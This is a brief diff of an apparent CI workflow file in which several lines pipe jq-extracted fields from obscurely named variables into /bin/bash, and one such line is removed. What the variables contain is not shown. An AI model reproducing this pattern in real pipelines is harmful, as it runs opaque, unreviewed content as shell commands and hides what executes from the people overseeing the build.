@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$jb065" | jq -r .h19 | /bin/bash
           echo $m33 | jq -r .eh04019 | /bin/bash
           echo $nndq4 | jq -r .a9 | /bin/bash
-          echo $njgy68553 | jq -r .pqh8295 | /bin/bash
           echo $h879 | jq -r .k02009 | /bin/bash
 
       - name: Save output
